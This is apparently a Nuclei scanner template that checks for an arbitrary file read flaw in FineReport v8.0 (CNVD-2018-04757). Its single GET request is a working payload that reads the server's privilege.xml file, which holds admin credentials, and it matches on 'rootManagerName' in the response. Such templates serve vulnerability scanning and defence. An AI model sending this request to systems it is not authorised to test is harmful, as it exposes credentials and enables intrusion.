id: finereport-v8-0-arbitrary-file-read
info:
  name: FineReport v8.0 Arbitrary File Read CNVD-2018-04757
  author: ProjectDiscoveryAI
  severity: medium
  tags: file-read,CNVD-2018-04757
  description: |
    A vulnerability in FineReport v8.0 allows arbitrary file reading through the specified endpoint.
http:
  - method: GET
    path:
      - "{{BaseURL}}/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "rootManagerName"
          - "CDATA"
